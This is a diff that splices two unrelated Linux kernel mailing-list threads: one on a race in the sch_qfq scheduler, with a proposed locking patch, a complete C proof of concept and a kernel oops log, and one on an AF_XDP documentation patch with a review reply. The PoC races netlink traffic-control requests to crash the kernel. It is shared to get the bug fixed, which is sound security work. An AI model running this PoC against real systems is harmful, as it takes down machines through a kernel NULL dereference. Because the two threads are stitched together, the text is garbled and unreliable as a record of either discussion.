->
-
-
-I did test your earlier repro and could not create the issue. I dont
-have time right now, but are you sure this new repro can create the
-issue?
-
-cheers,
-jamal
-
-> ```
-> From e64c4f5d662dc3f3c5dedf4b755a151d826d7f70 Mon Sep 17 00:00:00 2001
-> From: n132 <xmei5@asu.edu>
-> Date: Sun, 29 Jun 2025 16:26:43 -0700
-> Subject: [PATCH] net/sched: sch_qfq: Fix qfq_aggregate race condition
->
-> Apply sch_lock when reading or modifying agg data to prevent race conditi=
-ons between class options and enqueue.
+On Sat, Jun 28, 2025 at 08:08:40PM +0800, Jason Xing wrote:
+> From: Jason Xing <kernelxing@tencent.com>
+> 
+> The modified lines are mainly related to the following commits[1][2]
+> which remove those tests and examples. Since samples/bpf has been
+> deprecated, we can refer to more examples that are easily searched
+> in the various xdp-projects.
+> 
+> [1]: https://git.kernel.org/pub/scm/linux/kernel/git/netdev/net-next.git/commit/?id=f36600634
+> [2]: https://git.kernel.org/pub/scm/linux/kernel/git/netdev/net-next.git/commit/?id=cfb5a2dbf14
+> 
+> Signed-off-by: Jason Xing <kernelxing@tencent.com>
 > ---
->  net/sched/sch_qfq.c | 30 +++++++++++++++++++++---------
->  1 file changed, 21 insertions(+), 9 deletions(-)
->
-> diff --git a/net/sched/sch_qfq.c b/net/sched/sch_qfq.c
-> index bf1282cb22eb..dc77ffc01bb3 100644
-> --- a/net/sched/sch_qfq.c
-> +++ b/net/sched/sch_qfq.c
-> @@ -412,7 +412,7 @@ static int qfq_change_class(struct Qdisc *sch, u32 cl=
-assid, u32 parentid,
->         bool existing =3D false;
->         struct nlattr *tb[TCA_QFQ_MAX + 1];
->         struct qfq_aggregate *new_agg =3D NULL;
-> -       u32 weight, lmax, inv_w;
-> +       u32 weight, lmax, inv_w, old_weight, old_lmax;
->         int err;
->         int delta_w;
->
-> @@ -443,12 +443,16 @@ static int qfq_change_class(struct Qdisc *sch, u32 =
-classid, u32 parentid,
->         inv_w =3D ONE_FP / weight;
->         weight =3D ONE_FP / inv_w;
->
-> -       if (cl !=3D NULL &&
-> -          lmax =3D=3D cl->agg->lmax &&
-> -          weight =3D=3D cl->agg->class_weight)
-> -               return 0; /* nothing to change */
-> +       if(cl !=3D NULL){
-> +               sch_tree_lock(sch);
-> +               old_weight =3D cl->agg->class_weight;
-> +               old_lmax   =3D cl->agg->lmax;
-> +               sch_tree_unlock(sch);
-> +               if (lmax =3D=3D old_lmax && weight =3D=3D old_weight)
-> +                       return 0; /* nothing to change */
-> +       }
->
-> -       delta_w =3D weight - (cl ? cl->agg->class_weight : 0);
-> +       delta_w =3D weight - (cl ? old_weight : 0);
->
->         if (q->wsum + delta_w > QFQ_MAX_WSUM) {
->                 NL_SET_ERR_MSG_FMT_MOD(extack,
-> @@ -555,10 +559,10 @@ static int qfq_delete_class(struct Qdisc *sch, unsi=
-gned long arg,
->
->         qdisc_purge_queue(cl->qdisc);
->         qdisc_class_hash_remove(&q->clhash, &cl->common);
-> +       qfq_destroy_class(sch, cl);
->
->         sch_tree_unlock(sch);
->
-> -       qfq_destroy_class(sch, cl);
->         return 0;
->  }
->
-> @@ -625,6 +629,8 @@ static int qfq_dump_class(struct Qdisc *sch, unsigned=
- long arg,
->  {
->         struct qfq_class *cl =3D (struct qfq_class *)arg;
->         struct nlattr *nest;
-> +       u32 class_weight;
-> +       u32 lmax;
->
->         tcm->tcm_parent =3D TC_H_ROOT;
->         tcm->tcm_handle =3D cl->common.classid;
-> @@ -633,8 +639,12 @@ static int qfq_dump_class(struct Qdisc *sch, unsigne=
-d long arg,
->         nest =3D nla_nest_start_noflag(skb, TCA_OPTIONS);
->         if (nest =3D=3D NULL)
->                 goto nla_put_failure;
-> -       if (nla_put_u32(skb, TCA_QFQ_WEIGHT, cl->agg->class_weight) ||
-> -          nla_put_u32(skb, TCA_QFQ_LMAX, cl->agg->lmax))
-> +       sch_tree_lock(sch);
-> +       class_weight =3D cl->agg->class_weight;
-> +       lmax         =3D cl->agg->lmax;
-> +       sch_tree_unlock(sch);
-> +       if (nla_put_u32(skb, TCA_QFQ_WEIGHT, class_weight) ||
-> +          nla_put_u32(skb, TCA_QFQ_LMAX, lmax))
->                 goto nla_put_failure;
->         return nla_nest_end(skb, nest);
->
-> @@ -651,8 +661,10 @@ static int qfq_dump_class_stats(struct Qdisc *sch, u=
-nsigned long arg,
->
->         memset(&xstats, 0, sizeof(xstats));
->
-> +       sch_tree_lock(sch);
->         xstats.weight =3D cl->agg->class_weight;
->         xstats.lmax =3D cl->agg->lmax;
-> +       sch_tree_unlock(sch);
->
->         if (gnet_stats_copy_basic(d, NULL, &cl->bstats, true) < 0 ||
->            gnet_stats_copy_rate_est(d, &cl->rate_est) < 0 ||
-> --
-> 2.43.0
-> ```
->
-> Here is the PoC triggering the race condition for your reference:
->
-> ```c
-> #include <stdio.h>
-> #include <sys/socket.h>
-> #include <linux/rtnetlink.h>
-> #include <linux/pkt_sched.h>
-> #include <linux/if_arp.h>
-> struct tf_msg {
->     struct nlmsghdr nlh;
->     struct tcmsg tcm;
-> #define TC_DATA_LEN 0x200
->     char attrbuf[TC_DATA_LEN];
-> };
-> struct if_msg {
->     struct nlmsghdr nlh;
->     struct ifinfomsg ifi;
-> };
-> typedef unsigned int u32;
-> int nl, inet_sock_fd;
-> char *  msgQdiscCreate;
-> char *  tclass_0x20001_create;
-> char *  tclass_0x20002_create;
-> char *  tclass_0x20001_reset;
->
-> unsigned short add_rtattr (unsigned long rta_addr, unsigned short type, u=
-nsigned short len, char *data) {
->     struct rtattr *rta =3D (struct rtattr *)rta_addr;
->     rta->rta_type =3D type;
->     rta->rta_len =3D RTA_LENGTH(len);
->     memcpy(RTA_DATA(rta), data, len);
->     return rta->rta_len;
-> }
-> int initNL(){
->     struct if_msg if_up_msg =3D {
->         {
->             .nlmsg_len =3D 32,
->             .nlmsg_type =3D RTM_NEWLINK,
->             .nlmsg_flags =3D NLM_F_REQUEST | NLM_F_ACK,
->         },
->         {
->             .ifi_family =3D AF_UNSPEC,
->             .ifi_type =3D ARPHRD_NETROM,
->             .ifi_index =3D 1,
->             .ifi_flags =3D IFF_UP,
->             .ifi_change =3D 1,
->         },
->     };
->     int nl_sock_fd =3D socket(PF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
->     if_up_msg.ifi.ifi_index =3D if_nametoindex("lo");
->     NLMsgSend(nl_sock_fd, (struct tf_msg *)(&if_up_msg));
->     return nl_sock_fd;
-> }
-> void NLMsgSend (int sock, struct tf_msg *m) {
->     struct {
->         struct nlmsghdr nh;
->         struct nlmsgerr ne;
->     } ack;
->     write(sock, m, m->nlh.nlmsg_len);
->     read(sock , &ack, sizeof(ack));
-> }
-> /* Prepared Values*/
-> void init_loopbacksend (u32 prio) {
->     struct sockaddr iaddr =3D { AF_INET };
->     inet_sock_fd =3D socket(PF_INET, SOCK_DGRAM, 0);
->     int res =3D setsockopt(inet_sock_fd, SOL_SOCKET, SO_PRIORITY, &prio, =
-sizeof(prio));
->     connect(inet_sock_fd, &iaddr, sizeof(iaddr));
-> }
->
-> /* Trafic control for netlink */
-> void init_tf_msg (struct tf_msg *m) {
->     m->nlh.nlmsg_len    =3D NLMSG_LENGTH(sizeof(m->tcm));
->     m->nlh.nlmsg_type   =3D 0;    // Default Value
->     m->nlh.nlmsg_flags  =3D NLM_F_REQUEST | NLM_F_ACK;
->     m->nlh.nlmsg_seq    =3D 0;    // Default Value
->     m->nlh.nlmsg_pid    =3D 0;    // Default Value
->
->     // tcmsg
->     m->tcm.tcm_family   =3D PF_UNSPEC;
->     m->tcm.tcm_ifindex  =3D if_nametoindex("lo");
->     m->tcm.tcm_handle   =3D 0;    // Default Value
->     m->tcm.tcm_parent   =3D -1;   // Default Value for no parent
->     m->tcm.tcm_info     =3D 0;    // Default Value
-> }
->
-> struct tf_msg * classGet(u32 classid){
->     struct tf_msg *m =3D calloc(1,sizeof(struct tf_msg));
->     init_tf_msg(m);
->     m->nlh.nlmsg_type        =3D RTM_GETTCLASS;
->     m->tcm.tcm_handle        =3D classid;
->     return m;
-> }
-> struct tf_msg * qfqQdiscAdd(u32 handle, u32 parent) {
->     struct tf_msg *m =3D calloc(1,sizeof(struct tf_msg));
->     init_tf_msg(m);
->     m->nlh.nlmsg_type    =3D RTM_NEWQDISC;
->     m->nlh.nlmsg_flags   |=3D NLM_F_CREATE;
->     m->tcm.tcm_handle    =3D handle;
->     m->tcm.tcm_parent    =3D parent;
->     m->nlh.nlmsg_len     +=3D NLMSG_ALIGN(add_rtattr((size_t)m + NLMSG_AL=
-IGN(m->nlh.nlmsg_len), TCA_KIND, strlen("qfq") + 1, "qfq"));
->     return m;
-> }
-> struct tf_msg * qfqClassAdd(int type, u32 classid,u32 val){
->     struct tf_msg *m =3D calloc(1,sizeof(struct tf_msg));
->     init_tf_msg(m);
->     m->nlh.nlmsg_type       =3D RTM_NEWTCLASS;
->     m->tcm.tcm_parent       =3D 0;
->     m->tcm.tcm_handle       =3D classid;
->     m->nlh.nlmsg_flags      |=3D NLM_F_CREATE;
->     m->nlh.nlmsg_len        +=3D NLMSG_ALIGN(add_rtattr((size_t)m + NLMSG=
-_ALIGN(m->nlh.nlmsg_len), TCA_KIND, strlen("qfq") + 1, "qfq"));
->
->     struct rtattr *opts     =3D (struct rtattr *)((size_t)m + NLMSG_ALIGN=
-(m->nlh.nlmsg_len));
->     opts->rta_type          =3D TCA_OPTIONS;
->     opts->rta_len           =3D RTA_LENGTH(0);
->
->     if(type =3D=3D TCA_QFQ_LMAX)
->         opts->rta_len +=3D RTA_ALIGN(add_rtattr((size_t)opts + opts->rta_=
-len, TCA_QFQ_LMAX, sizeof(val), (char *)&val));
->     else if(type =3D=3D TCA_QFQ_WEIGHT)
->         opts->rta_len +=3D RTA_ALIGN(add_rtattr((size_t)opts + opts->rta_=
-len, TCA_QFQ_WEIGHT, sizeof(val), (char *)&val));
->     m->nlh.nlmsg_len +=3D NLMSG_ALIGN(opts->rta_len);
->     return m;
-> }
-> void initContext(){
->     msgQdiscCreate =3D        qfqQdiscAdd(0x20000,-1);
->     tclass_0x20001_reset  =3D tclass_0x20001_create =3D qfqClassAdd(TCA_Q=
-FQ_LMAX,0x20001,0x200);
->     tclass_0x20002_create =3D qfqClassAdd(TCA_QFQ_LMAX,0x20002,0x400);
-> }
-> int main(){
->     initContext();
->     nl =3D initNL();
->     NLMsgSend(nl,msgQdiscCreate);
->     NLMsgSend(nl,tclass_0x20001_create);
->     NLMsgSend(nl,tclass_0x20002_create);
->     init_loopbacksend(0x20001);
->     if(fork()){
->         while(1){
->             write(inet_sock_fd, "", 0x400-42); // upgrade
->             NLMsgSend(nl,tclass_0x20001_reset);
->         }
->     }else{
->         char * pay =3D classGet(0x20001);
->         while(1)
->             NLMsgSend(nl,pay);
->     }
-> }
->
-> /*
-> [    1.078863] BUG: kernel NULL pointer dereference, address: 00000000000=
-00028
-> [    1.079284] #PF: supervisor read access in kernel mode
-> [    1.079580] #PF: error_code(0x0000) - not-present page
-> [    1.079882] PGD 101e10067 P4D 101e10067 PUD 101e11067 PMD 0
-> [    1.080211] Oops: 0000 [#1] PREEMPT SMP NOPTI
-> [    1.080466] CPU: 1 PID: 117 Comm: exploit Not tainted 6.6.94 #1
-> [    1.080873] Hardware name: QEMU Ubuntu 24.04 PC (i440FX + PIIX, 1996),=
- BIOS 1.16.3-debian-1.16.3-2 04/01/2014
-> [    1.081426] RIP: 0010:qfq_dump_class+0x7f/0x120
-> [    1.081700] Code: 2b 95 ff 85 c0 0f 88 a3 00 00 00 4d 85 e4 0f 84 9a 0=
-0 00 00 48 8b 45 68 48 8d 4c 24 04 ba 04 00 00 00 48 89 df be 01 00 00 00 <=
-8b> 40 28 89 44 24 04 e8 c5 2b 95 ff 85 c0 75 5b 48 8b 45 68 48 8d
-> [    1.082747] RSP: 0018:ffffc900004975b0 EFLAGS: 00010282
-> [    1.083050] RAX: 0000000000000000 RBX: ffff8881013e7100 RCX: ffffc9000=
-04975b4
-> [    1.083447] RDX: 0000000000000004 RSI: 0000000000000001 RDI: ffff88810=
-13e7100
-> [    1.083846] RBP: ffff888100b90380 R08: 0000000000000014 R09: ffff88810=
-177e030
-> [    1.084238] R10: 00000000000381a0 R11: ffff888101fd8000 R12: ffff88810=
-177e02c
-> [    1.084645] R13: ffff88810177e000 R14: ffffffff82d662a0 R15: ffff88810=
-1fd8000
-> [    1.085072] FS:  00000000198fe3c0(0000) GS:ffff88811c500000(0000) knlG=
-S:0000000000000000
-> [    1.085557] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
-> [    1.085888] CR2: 0000000000000028 CR3: 000000010168e000 CR4: 000000000=
-0750ee0
-> [    1.086329] PKRU: 55555554
-> [    1.086491] Call Trace:
-> [    1.086645]  <TASK>
-> [    1.086777]  tc_fill_tclass+0x145/0x240
-> [    1.087008]  tclass_notify.constprop.0+0x6a/0xd0
-> [    1.087275]  tc_ctl_tclass+0x3bc/0x5a0
-> [    1.087496]  rtnetlink_rcv_msg+0x14e/0x3d0
-> [    1.087734]  ? kmem_cache_alloc_node+0x4b/0x520
-> [    1.088011]  ? __pfx_rtnetlink_rcv_msg+0x10/0x10
-> [    1.088281]  netlink_rcv_skb+0x57/0x100
-> [    1.088506]  netlink_unicast+0x247/0x390
-> [    1.088733]  netlink_sendmsg+0x250/0x4d0
-> [    1.088964]  sock_write_iter+0x199/0x1a0
-> [    1.089192]  vfs_write+0x393/0x440
-> [    1.089396]  ksys_write+0xb7/0xf0
-> [    1.089591]  do_syscall_64+0x5e/0x90
-> [    1.089801]  ? do_syscall_64+0x6a/0x90
-> [    1.090022]  ? netlink_rcv_skb+0x84/0x100
-> [    1.090254]  ? kmem_cache_free+0x1e/0x360
-> [    1.090484]  ? kmem_cache_free+0x1e/0x360
-> [    1.090713]  ? netlink_unicast+0x252/0x390
-> [    1.090953]  ? netlink_sendmsg+0x25d/0x4d0
-> [    1.091189]  ? sock_write_iter+0x199/0x1a0
-> [    1.091425]  ? vfs_write+0x393/0x440
-> [    1.091633]  ? exit_to_user_mode_prepare+0x1a/0x150
-> [    1.091915]  ? syscall_exit_to_user_mode+0x27/0x40
-> [    1.092190]  ? do_syscall_64+0x6a/0x90
-> [    1.092407]  ? exit_to_user_mode_prepare+0x1a/0x150
-> [    1.092686]  ? syscall_exit_to_user_mode+0x27/0x40
-> [    1.092962]  ? do_syscall_64+0x6a/0x90
-> [    1.093180]  ? do_syscall_64+0x6a/0x90
-> [    1.093397]  ? clear_bhb_loop+0x60/0xb0
-> [    1.093620]  ? clear_bhb_loop+0x60/0xb0
-> [    1.093842]  ? clear_bhb_loop+0x60/0xb0
-> [    1.094066]  ? clear_bhb_loop+0x60/0xb0
-> [    1.094287]  ? clear_bhb_loop+0x60/0xb0
-> [    1.094508]  entry_SYSCALL_64_after_hwframe+0x78/0xe2
-> */
-> ```
->
-> >
-> > cheers,
-> > jamal
-> >
-> >
-> > > Thanks,
-> > > Xiang Mei
+>  Documentation/networking/af_xdp.rst | 45 ++++++++---------------------
+>  1 file changed, 12 insertions(+), 33 deletions(-)
+> 
+> diff --git a/Documentation/networking/af_xdp.rst b/Documentation/networking/af_xdp.rst
+> index dceeb0d763aa..37711619e89e 100644
+> --- a/Documentation/networking/af_xdp.rst
+> +++ b/Documentation/networking/af_xdp.rst
+> @@ -209,13 +209,10 @@ Libbpf
+>  
+>  Libbpf is a helper library for eBPF and XDP that makes using these
+>  technologies a lot simpler. It also contains specific helper functions
+> -in tools/lib/bpf/xsk.h for facilitating the use of AF_XDP. It
+> -contains two types of functions: those that can be used to make the
+> -setup of AF_XDP socket easier and ones that can be used in the data
+> -plane to access the rings safely and quickly. To see an example on how
+> -to use this API, please take a look at the sample application in
+> -samples/bpf/xdpsock_usr.c which uses libbpf for both setup and data
+> -plane operations.
+> +in ./tools/testing/selftests/bpf/xsk.h for facilitating the use of
+> +AF_XDP. It contains two types of functions: those that can be used to
+> +make the setup of AF_XDP socket easier and ones that can be used in the
+> +data plane to access the rings safely and quickly.
+>  
+>  We recommend that you use this library unless you have become a power
+>  user. It will make your program a lot simpler.
+> @@ -372,8 +369,7 @@ needs to explicitly notify the kernel to send any packets put on the
+>  TX ring. This can be accomplished either by a poll() call, as in the
+>  RX path, or by calling sendto().
+>  
+> -An example of how to use this flag can be found in
+> -samples/bpf/xdpsock_user.c. An example with the use of libbpf helpers
+> +An example with the use of libbpf helpers
+>  would look like this for the TX path:
+>  
+>  .. code-block:: c
+> @@ -551,10 +547,9 @@ Usage
+>  
+>  In order to use AF_XDP sockets two parts are needed. The
+>  user-space application and the XDP program. For a complete setup and
+> -usage example, please refer to the sample application. The user-space
+> -side is xdpsock_user.c and the XDP side is part of libbpf.
+> +usage example, please refer to the xdp-project.
+>  
+> -The XDP code sample included in tools/lib/bpf/xsk.c is the following:
+> +The XDP code sample is the following:
+>  
+>  .. code-block:: c
+>  
+> @@ -753,27 +748,11 @@ to facilitate extending a zero-copy driver with multi-buffer support.
+>  Sample application
+>  ==================
+>  
+> -There is a xdpsock benchmarking/test application included that
+> -demonstrates how to use AF_XDP sockets with private UMEMs. Say that
+> -you would like your UDP traffic from port 4242 to end up in queue 16,
+> -that we will enable AF_XDP on. Here, we use ethtool for this::
+> -
+> -      ethtool -N p3p2 rx-flow-hash udp4 fn
+> -      ethtool -N p3p2 flow-type udp4 src-port 4242 dst-port 4242 \
+> -          action 16
+> -
+> -Running the rxdrop benchmark in XDP_DRV mode can then be done
+> -using::
+> -
+> -      samples/bpf/xdpsock -i p3p2 -q 16 -r -N
+> -
+> -For XDP_SKB mode, use the switch "-S" instead of "-N" and all options
+> -can be displayed with "-h", as usual.
+
+Hi Jason,
+
+these commands above should be kept as-is imho and we should point users
+to new xdpsock's location:
+
+https://github.com/xdp-project/bpf-examples/tree/main/AF_XDP-example
+
+> -
+> -This sample application uses libbpf to make the setup and usage of
+> -AF_XDP simpler. If you want to know how the raw uapi of AF_XDP is
+> -really used to make something more advanced, take a look at the libbpf
+> -code in tools/lib/bpf/xsk.[ch].
+> +Xdpsock benchmarking/test application can be found through googling
+> +the various xdp-project repositories connected to libxdp. If you want
+> +to know how the raw uapi of AF_XDP is really used to make something
+> +more advanced, take a look at the libbpf code in
+> +tools/testing/selftests/bpf/xsk.[ch].
+>  
+>  FAQ
+>  =======
+> -- 
+> 2.41.3
+> 
+> 
 
